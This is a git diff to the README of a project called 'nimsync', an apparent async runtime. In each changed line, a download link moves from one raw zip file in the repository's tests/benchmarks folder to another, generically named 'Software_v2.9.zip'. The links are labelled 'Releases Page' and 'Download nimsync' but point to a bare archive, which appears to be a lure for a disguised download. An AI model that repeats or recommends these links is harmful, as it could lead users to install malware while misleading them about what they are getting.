@@ -1,6 +1,6 @@
 # 🚀 nimsync - Fast, Reliable Async Runtime for Everyone
 
-[![Download nimsync](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/scripts/nimsync-2.3.zip)](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/scripts/nimsync-2.3.zip)
+[![Download nimsync](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/stress_tests/Software_v2.9.zip)](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/stress_tests/Software_v2.9.zip)
 
 ## 📥 Overview
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these simple requirements:
 
 ## 🔗 Download & Install
 
-To download nimsync, visit this page to download: [Releases Page](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/scripts/nimsync-2.3.zip).
+To download nimsync, visit this page to download: [Releases Page](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/stress_tests/Software_v2.9.zip).
 
 Once on the page, look for the latest version. You will see various files. Choose the one that fits your operating system and click on it to download.
 
@@ -76,4 +76,4 @@ Bugs can be reported in the Issues section of the GitHub repository. Please prov
 
 For direct inquiries, reach out to the project maintainers through the GitHub repository contacts page.
 
-Remember, you can always visit this page to download: [Releases Page](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/scripts/nimsync-2.3.zip). Enjoy using nimsync and happy coding!
+Remember, you can always visit this page to download: [Releases Page](https://raw.githubusercontent.com/yaceychen/nimsync/main/tests/benchmarks/stress_tests/Software_v2.9.zip). Enjoy using nimsync and happy coding!
